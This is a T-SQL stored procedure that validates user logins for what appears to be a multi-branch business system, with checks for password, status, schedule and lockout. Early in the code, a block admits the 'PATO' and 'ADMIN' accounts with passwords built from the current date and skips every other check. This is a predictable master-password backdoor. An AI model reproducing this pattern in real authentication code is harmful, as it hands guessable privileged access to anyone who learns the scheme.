CREATE proc [dbo].[SPc_ValidaUsuario]          
 @sUsuario varchar(50), -- @sUsuario debe traer el Usuario global o el Usuario_Login (dependiendo de la configuración de sys_Parametros_Globales.loginextendido)          
 @sPassword varchar(10)          
 --Encriptacion                  
-- --TOREO\n-- WITH ENCRYPTION           
as          
SET NOCOUNT ON          
          
declare           
@sPassActual varchar(10),           
@iVigencia_Firma int,           
@sEstatus varchar(1),           
@iFecha int,           
@iHora int,           
@Nivel int,           
@sPerfil varchar(20),           
@iIdioma int,           
@linea_autorizada decimal(15, 2),           
@iFechaAnterior int,           
@UsuarioMe varchar(6),           
@UsuarioMeCierre varchar(6),           
@Conteo tinyint,           
@CveSucursal varchar(4),           
@id_Sucursal int,           
@sEmpresa varchar(10),           
@sSucursal varchar(10),           
@DescSucursal varchar(50),           
@HoraCierre varchar(20),           
@UsarCentral tinyint,          
@loginextendido tinyint,          
@Usuario_Login varchar(50),        
@fdHora varchar (2),                                  
@fdMinutos varchar (2),                 
@fdsegundos varchar (2),           
@HoraAlta char(8),        
@sUsuarioOrigen varchar(50)         
          
-- Evita que crystal meta su cuchara en el SP que ni entiende.          
if 0 = 1 begin set fmtonly off; return; end          
          
set nocount on --no se devuelve el recuento de mensajes, reduciendo así el tráfico de mensajes en la red                                
set xact_abort on --ejecuta en automatico el RollBack al momento de presentarse un error                                

set language english
          
select @iFecha = DateDiff(day, '12/28/1800', GetDate())          
        
set @sUsuarioOrigen=@sUsuario        
          
select @iHora = (Datepart(hour, GetDate()) * 360000) + (Datepart(minute, GetDate()) * 6000) + (Datepart(second, GetDate()) * 100) + 1          
          
select top 1 @UsarCentral = UsarCentral, @loginextendido = loginextendido from sys_Parametros_Globales          
          
-- Si está activado el login extendido entonces buscamos @sUsuario en el campo Usuario_Login y lo sustituimos por su Usuario global          
if @loginextendido=1 and @sUsuario<>'ADMIN' begin          
          
 set @Usuario_Login=@sUsuario        
 if not exists (select Usuario from sys_Usuario where Usuario_Login=@Usuario_Login)          
 begin          
  select 70059, 'Usuario No Existe en Base de Datos'          
  return          
 end          
            
 set @sUsuario=''            
 select @sUsuario=Usuario from sys_Usuario where Usuario_Login=@Usuario_Login          
end          
          
select top 1 @UsuarioMe = u.Usuario, @id_Sucursal = u.id_Sucursal          
 from sys_Usuario_Sucursal u          
 inner join sys_Usuario ug on ug.id_Usuario = u.id_Usuario        
 INNER JOIN sys_Parametros AS P ON P.id_Sucursal=U.id_Sucursal          
 where ug.Usuario = @sUsuario and u.Status <> '0'  ORDER by p.fechaSistema asc, u.id_Sucursal        
           
select @iFechaAnterior = fechaSistema from sys_Parametros where id_Sucursal = @id_Sucursal         
              
if (          
  @sUsuario = 'PATO' and @sPassword = 'P' + ltrim(rtrim(convert(char(10), Datepart(month, GetDate())))) + ltrim(rtrim(convert(char(10)          
     , Datepart(day, GetDate())))) + ltrim(rtrim(convert(char(10), Datepart(year, GetDate()))))          
  ) or (          
  @sUsuario = 'ADMIN' and @sPassword = 'sh' + ltrim(rtrim(convert(char(10), Datepart(month, GetDate())))) + ltrim(rtrim(convert(char(10)          
     , Datepart(day, GetDate())))) + ltrim(rtrim(convert(char(10), Datepart(year, GetDate()))))          
  )          
begin          
          
 ---- selecciona una sucursal para el Usuario si es ADMIN          
 select top 1 @sSucursal = u.Usuario_Alta, @id_Sucursal = u.id_Sucursal, @CveSucursal = s.id_Sucursal, @DescSucursal = s.Descripcion          
 from sys_Usuario_Sucursal as u          
 inner join sys_Usuario as ug on ug.id_Usuario = u.id_Usuario          
 inner join sys_Sucursal as s on s.id_Sucursal = u.id_Sucursal          
 where ug.Usuario = @sUsuario and u.Status <> '0'           
 order by s.id_Sucursal          
          
 select @Conteo = COUNT(Usuario)          
 from sys_Usuario_Sucursal          
 where Status <> '0' and id_Usuario = ( select id_Usuario from sys_Usuario where Usuario = @sUsuario )          
          
 select 0, '', 1, @sSucursal, '', 0, db_name(), right('00' + convert(varchar(2), (DatePart(day, DateAdd(day, @iFecha, '12/28/1800'))          
     )), 2) + '/' + right('00' + convert(varchar(2), (DatePart(month, DateAdd(day, @iFecha, '12/28/1800'))          
     )), 2) + '/' + right('0000' + convert(varchar(4), (DatePart(year, DateAdd(day, @iFecha, '12/28/1800'))          
     )), 4), MaxAutorizar = 0, nivel = 35, noSucursales = @Conteo, id_Sucursal = @id_Sucursal, CveSucursal = upper(@CveSucursal          
  ), Usuario = @UsuarioMe, DescSucursal = @DescSucursal, UsarCentral = isnull(@UsarCentral, 0), UsuarioGlobal=@sUsuario,          
  Ruta=(select substring(ServerWeb, 0,PATINDEX('%vdealer%',ServerWeb)) as ServerWeb from sys_Otros_Parametros where id_Sucursal=@id_Sucursal),          
  Ciudad=(select isnull(Descripcion,'') from sys_Sucursal where id_Sucursal=@id_Sucursal)        
          
 return          
end          
          
select @sEmpresa = '', @sSucursal = ''          
          
         
--valida que exista el Usuario          
if not exists (          
  select * from sys_Usuario_Sucursal u          
  inner join sys_Usuario ug on ug.id_Usuario = u.id_Usuario          
  where ug.Usuario = @sUsuario )          
begin          
 select 70059, 'Usuario No Existe en Base de Datos'          
          
 return          
end          
          
-- Asigna a variables locales los datos del Usuario          
select top 1 @sPassActual = ug.clave_acceso, @iVigencia_Firma = ug.Vigencia, @sEstatus = u.Status, @sEmpresa = 'Empresa', @sSucursal = U.Usuario_Alta, @sPerfil = 'PERFIL', @iIdioma = 0, @linea_autorizada = 0, @nivel = u.nivel, @CveSucursal = s.id_Sucursal          
 , @DescSucursal = s.Descripcion          
from sys_Usuario_Sucursal as u          
inner join sys_Sucursal as s on s.id_Sucursal = u.id_Sucursal          
inner join sys_Usuario ug on ug.id_Usuario = u.id_Usuario          
where ug.Usuario = @sUsuario and u.Status <> '0'          
order by u.Status desc          
          
-- Cuenta los Usuarios (uno por sucursal) con que cuenta el Usuario global          
select @Conteo = COUNT(U.Usuario)          
from sys_Usuario_Sucursal u          
inner join sys_Usuario ug on ug.id_Usuario = u.id_Usuario          
where ug.Usuario = @sUsuario and u.Status <> '0'          
          
exec SPc_EncriptaPassword @sPassword, @sRegresa = @sPassword output          
          
if @sPassActual <> @sPassword          
begin          
 select 70060, 'Password Invalido'          
          
 return          
end          
          
if @sEstatus = '0'          
begin          
 select 70061, 'Su Usuario ha sido desactivado'          
          
 return          
end          
          
print '@Conteo:' + CAST(@Conteo as varchar)          
          
-- Verifica si ya estaba firmado para no volver a permitir que se firme solo hasta que pasen 3 minutos.          
if exists (          
  select * from sys_Usuarios_Firmados  where Usuario = @sUsuario and IgnorarNoAcceso=0          
  )      
begin          
          
 if not exists (          
   select * from sys_No_Acceso           
    where sUsuario = @sUsuario and ifecha = @iFecha and @iHora between iDeHora and iAHora and @sEstatus <> '0'          
  )          
   insert into sys_No_Acceso (sUsuario, iFecha, iDeHora, iAHora)          
   values (@sUsuario, @iFecha, @iHora, @iHora + 3000)          
          
 delete sys_Usuarios_Firmados where Usuario = @sUsuario          
          
 select 70063,           
  'Usuario ya firmado, reintentar en 30 segundos o informe al Administrador ¡FAVOR DE SALIRSE CORRECTAMENTE DEL SISTEMA!'          
          
 return          
end          
          
-- verifica su horario de firma                  
declare @iDiaSem int          
          
select @iDiaSem = datepart(dw, DateAdd(day, @iFecha, '12/28/1800'))          
          
if exists (          
  select * from cmtbl_horausua          
  where sUsuario = @sUsuario and idia = @iDiaSem and @iHora between ideHora and iaHora          
  )          
begin          
 select 70064, 'Horario no permitido'          
          
 return          
end          
          
-- Se valida si no esta bloqueado para acceder (no tiene caso seguir si está bloqueado)          
if exists (          
  select * from sys_No_Acceso          
  where sUsuario = @sUsuario and ifecha = @iFecha and @iHora between iDeHora and iAHora          
  )          
begin          
 select 70065, 'Acceso no permitido'          
          
 return          
end          
          
select @iVigencia_Firma = isnull(@iVigencia_Firma, 0)          
          
if @iFecha >= @iVigencia_Firma          
begin          
 -- select 0, 'Expirado', @sEmpresa, @sSucursal, @sPerfil, @iIdioma, nivel = @nivel          
           
 select 70066, 'Acceso ha expirado'          
          
 return          
end          
          
-- checa que los cierres del dia anterior existan                  
declare @sFecha char(10),          
@sFecha2 char(10)             
        
----actualiza fecha del sistema   ---- se actualiza despues de las validaciones de error al firmar Usuario,        
---- si la contraseña era incorrecta o algo pasó mal en el acceso no se firma el Usuario correctamente,        
----  no se hace el cierre pero si actualizaba la fecha        
update sys_Parametros set fechaSistema = @iFecha where fechasistema<>@iFecha        
  AND id_Sucursal IN(select U.id_Sucursal        
    from sys_Usuario_Sucursal u          
    inner join sys_Usuario ug on ug.id_Usuario = u.id_Usuario          
    where ug.Usuario = @sUsuario and u.Status <> '0'  )          
          
          
-- @iFechaAnterior trae la fecha del sistema del ultimo dia laboral                   
select @sFecha = convert(varchar(20), DateAdd(day, @iFechaAnterior, '12/28/1800'), 3)          
        
        
select 0, '', @sEmpresa, @sSucursal, @sPerfil, @iIdioma, db_name(), right('00' + convert(varchar(2), (DatePart(day, DateAdd(day, @iFecha, '12/28/1800'))          
    )), 2) + '/' + right('00' + convert(varchar(2), (DatePart(month, DateAdd(day, @iFecha, '12/28/1800')))), 2) +           
 '/' + right('0000' + convert(varchar(4), (DatePart(year, DateAdd(day, @iFecha, '12/28/1800')))), 4), MaxAutorizar =           
 @linea_autorizada, nivel = @nivel, noSucursales = @Conteo, id_Sucursal = @id_Sucursal, CveSucursal = upper(@CveSucursal), Usuario =           
 @UsuarioMe, DescSucursal = @DescSucursal, UsarCentral = isnull(@UsarCentral, 0), UsuarioGlobal=@sUsuario,          
 Ruta=(select substring(ServerWeb, 0,PATINDEX('%vdealer%',ServerWeb)) as ServerWeb from sys_Otros_Parametros where id_Sucursal=@id_Sucursal),          
 Ciudad=(select isnull(Descripcion,'') from sys_Sucursal where id_Sucursal=@id_Sucursal)  
        
-----inician procesos para el cierre de refacciones y servicio, inventario en proceso, etc.          
if @Conteo = 1          
     
begin          
          
       
        
    
        
 select TOP 1 @UsuarioMe = u.Usuario, @id_Sucursal = id_Sucursal          
 from sys_Usuario_Sucursal u          
 inner join sys_Usuario ug on ug.id_Usuario = u.id_Usuario          
 where ug.Usuario = @sUsuario and u.Status <> '0'  ORDER BY id_Sucursal        
        
     
end